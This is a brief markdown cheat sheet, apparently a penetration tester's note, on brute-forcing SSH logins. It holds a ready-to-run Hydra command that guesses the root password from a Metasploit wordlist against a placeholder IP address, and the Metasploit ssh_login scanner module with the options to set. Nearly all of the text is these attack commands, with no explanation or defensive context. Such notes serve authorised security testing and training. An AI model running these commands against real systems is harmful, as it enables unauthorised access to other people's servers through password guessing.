# Brute Force Attacks
## Hydra
- ```hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://(ip address):22 -t 4 -V```

## Metasploit
- auxiliary/scanner/ssh_login
  - set username
  - set pass_file
  - set RHOSTS
